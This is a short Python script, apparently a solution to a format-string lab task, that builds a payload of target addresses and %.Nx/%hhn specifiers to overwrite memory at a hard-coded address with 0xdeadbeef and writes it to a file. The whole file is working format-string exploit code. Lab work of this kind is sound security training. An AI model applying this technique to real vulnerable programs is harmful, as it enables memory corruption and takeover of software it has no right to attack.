#!/usr/bin/python3
# task1_2: change the value of the target address to 0xdeadbeef

# target address
addr = 0xffffcf68
# ad < be < de < ef
# 1: modify the 3rd byte
payload = (addr+2).to_bytes(4,byteorder='little')
payload += ("abcd").encode('latin-1')
# 2: modify the 2nd byte
payload += (addr+1).to_bytes(4,byteorder='little')
payload += ("abcd").encode('latin-1')
# 3: modify the 4th byte
payload += (addr+3).to_bytes(4,byteorder='little')
payload += ("abcd").encode('latin-1')
# 4: modify the 1st byte
payload += (addr).to_bytes(4,byteorder='little')
# new value
new_val = 0xdeadbeef

# 0xad - 4*7 - 5*8
len1 = 0xad - 4*7 - 5*8
len2 = 0xbe - 0xad
len3 = 0xde - 0xbe
len4 = 0xef - 0xde

payload += ("%.8x"*5 + 
            "%.{}x".format(len1) + "%hhn" + 
            "%.{}x".format(len2) + "%hhn" + 
            "%.{}x".format(len3) + "%hhn" + 
            "%.{}x".format(len4) + "%hhn").encode('latin-1')

with open('input', 'wb') as f:
  f.write(payload)